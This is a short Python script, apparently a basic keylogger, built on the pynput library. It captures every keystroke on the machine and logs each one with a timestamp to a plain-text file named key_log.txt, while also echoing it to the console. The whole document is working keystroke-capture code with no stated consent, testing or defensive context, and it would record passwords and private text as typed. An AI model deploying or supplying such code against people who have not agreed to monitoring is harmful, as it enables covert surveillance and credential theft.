from pynput import keyboard
import logging

# Set log file path
log_file = "key_log.txt"

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        print(f"Key {key.char} pressed")
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        print(f"Special Key {key} pressed")
        logging.info(f"Special Key {key} pressed")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
